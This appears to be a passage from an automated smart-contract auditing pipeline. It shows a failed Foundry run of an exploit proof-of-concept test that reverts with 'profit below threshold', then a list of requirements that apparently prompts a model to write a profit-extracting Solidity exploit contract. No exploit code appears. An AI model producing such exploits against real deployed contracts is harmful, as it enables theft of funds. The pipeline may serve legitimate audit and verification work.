    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 3.13s (4.39ms CPU time)

Ran 1 test suite in 3.18s (3.13s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 132265)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
